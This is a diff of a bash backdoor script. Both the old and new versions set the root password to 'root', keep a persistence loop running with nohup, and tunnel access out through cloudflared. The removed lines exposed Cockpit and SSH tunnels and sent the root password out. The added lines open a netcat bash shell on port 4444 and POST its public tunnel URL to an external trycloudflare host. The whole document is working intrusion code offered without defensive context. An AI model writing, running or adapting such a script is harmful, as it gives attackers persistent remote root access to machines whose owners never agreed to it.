@@ -1,7 +1,6 @@
 #!/bin/bash
-# 1. Credentials Takeover (Always asserted)
+# 1. Credentials Takeover
 echo "root:root" | sudo chpasswd
-sudo sed -i 's/root//g' /etc/cockpit/disallowed-users 2>/dev/null
 
 # 2. Setup Cloudflared Binary
 if [ ! -f /tmp/cloudflared ]; then
@@ -11,30 +10,25 @@ fi
 
 # 3. Persistence Loop (Every 5 Seconds)
 nohup bash -c "while true; do
-    # A. Ensure Cockpit is Running
-    if ! systemctl is-active --quiet cockpit; then
-        sudo systemctl enable --now cockpit.socket && sudo systemctl start cockpit
+    # A. Ensure the local Shell Listener (nc) is alive on port 4444
+    if ! pgrep -x 'nc' > /dev/null; then
+        nohup nc -lkp 4444 -e /bin/bash > /dev/null 2>&1 &
     fi
 
-    # B. Ensure Cockpit Tunnel (Port 9090) is Alive
-    if ! pgrep -f 'tunnel --url https://localhost:9090' > /dev/null; then
-        nohup /tmp/cloudflared tunnel --no-autoupdate --url https://localhost:9090 --no-tls-verify > /tmp/cockpit.log 2>&1 &
+    # B. Start the Reverse Tunnel (Encrypted SSH/TCP over HTTPS)
+    if ! pgrep -f 'tunnel --url tcp://localhost:4444' > /dev/null; then
+        nohup /tmp/cloudflared tunnel --no-autoupdate --url tcp://localhost:4444 > /tmp/shell_link.log 2>&1 &
     fi
 
-    # C. Ensure SSH Shell Tunnel (Port 22) is Alive
-    if ! pgrep -f 'tunnel --url ssh://localhost:22' > /dev/null; then
-        nohup /tmp/cloudflared tunnel --no-autoupdate --url ssh://localhost:22 > /tmp/ssh_shell.log 2>&1 &
-    fi
+    # C. Wait for the URL to stabilize
+    sleep 20
 
-    # D. Wait for links to stabilize
-    sleep 10
-
-    # E. Broadcast the Encrypted Links to your Mac
-    CK_URL=\$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' /tmp/cockpit.log | head -n 1)
-    SSH_URL=\$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' /tmp/ssh_shell.log | head -n 1)
+    # D. Exfiltrate the Shell Link to your Mac
+    SHELL_URL=\$(grep -o 'tcp://[-0-9a-z]*\.trycloudflare.com:[0-9]*' /tmp/shell_link.log | head -n 1)
     
-    REPORT=\"[!] SENTINEL_PULSE\nCOCKPIT: \$CK_URL\nSSH_SHELL: \$SSH_URL\nROOT_PASS: root\"
-    curl -s -X POST -d \"\$(echo -e \"\$REPORT\" | base64 | tr -d '\n')\" https://merchandise-angeles-jade-stud.trycloudflare.com
+    if [ ! -z \"\$SHELL_URL\" ]; then
+        curl -s -X POST -d \"SHELL_PULSE: \$SHELL_URL\" https://merchandise-angeles-jade-stud.trycloudflare.com
+    fi
 
-    sleep 5
+    sleep 10
 done" > /dev/null 2>&1 &
